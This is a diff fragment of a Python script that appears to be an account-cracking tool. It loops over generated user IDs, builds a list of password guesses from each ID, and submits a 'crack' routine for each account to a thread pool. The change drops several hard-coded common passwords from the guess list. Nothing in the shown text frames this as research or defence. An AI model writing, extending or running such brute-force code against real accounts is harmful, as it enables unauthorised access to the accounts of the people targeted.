@@ -116,7 +116,7 @@ def random_number():
         linex()
         for xyz in idz:
             uid = code+xyz
-            pww = [xyz,uid,'khankhan','khan123','khan1122','khan1234','khan786'] 
+            pww = [xyz,uid] 
             XYZ.submit(crack, uid, pww, total_idz)
     linex()
     print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
